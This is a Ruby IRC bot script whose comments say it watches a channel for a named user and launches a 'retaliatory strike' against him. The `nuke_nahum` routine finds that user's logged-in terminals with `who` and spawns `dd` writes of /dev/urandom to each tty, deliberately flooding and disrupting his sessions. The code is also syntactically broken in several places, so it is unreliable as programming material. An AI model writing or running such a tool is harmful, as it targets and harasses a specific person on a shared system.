#!/usr/bin/env ruby
################################################################################
# ruby >=1.9
#
# We are all sick of nahums shit, so this bot checks at random intervals to see
# if nahum has been "contributing" to the chat recently.  Upon finding wonton
# nahumism, a retaliatory strike is issued.
#
################################################################################
require 'socket'
require 'openssl'
require 'thread'

server = 'irc.xxxxx.org'
port = '6697'
channel = '#xxxxxx'

module IRC
  def initialize(server, port, ssl)
    conn = TCPSocket.new(server, port)
    @socket = OpenSSL::SSL::SSLSocket.new(conn)
    @socket.connect
 
    say "NICK stf_nahum"
    say "USER stf_nahum"
    say "JOIN ##{channel}"
  end
  
  def say(msg)
    puts msg
    @socket.puts msg
  end
  
  def run
    until @socket.eof? do
    msg = @socket.gets
    puts msg
    @history.push( ['timestamp' => Time.now, 'username' => msg.match(/<.(\w+)>/) )
      
    if msg.match(/^PING :(.*)$/)
      say "PONG #{$~[1]}"
      next
    end
  end
  
  def get_history
    return @history
  end
end  

module STF(irc)
  def self.is_nahum_alive
    if irc == nil
      puts "no tcp socket detected"
      exit!
    end
 
=begin testing array iteration
  history = [ 'timestamp' => Time.now.to_i - 2000, 'msg' => 'current' ]
  history.push('timestamp' => Time.now.to_i - 4000, 'msg' => 'old' )
  puts history.inspect
  recent = history.take_while { |i| i['timestamp'].to_i - (Time.now.to_i - 3600) > 0 }.each { |i| i['msg'] }
  puts recent.inspect
=end
 
    # get all people seen in the last hour
    recent_chatters = irc.get_history.take_while { |i| i['timestamp'].to_i - (Time.now.to_i - 3600) > 0 }.each { |i| i['username'] }
    if recent_chatters.detect { |i| i == "nahum" }?
      return true
    else
      return false
    end
  end
  
  def self.nuke_nahum
    # every pts/xxx he is logged into (includes screen sessions?)
    nahum_terminals = `who | grep nahum`.scan(/nahum\s+(\w+.\w+)/)
    #puts nahum_terminals.inspect
    # spawn child threads of dd /dev/urandom at each terminal currently connected
    nahum_terminals.each { |term| spawn 'dd if=/dev/urandom of=/dev/#{term} bs=512M count=1' }
  end
end
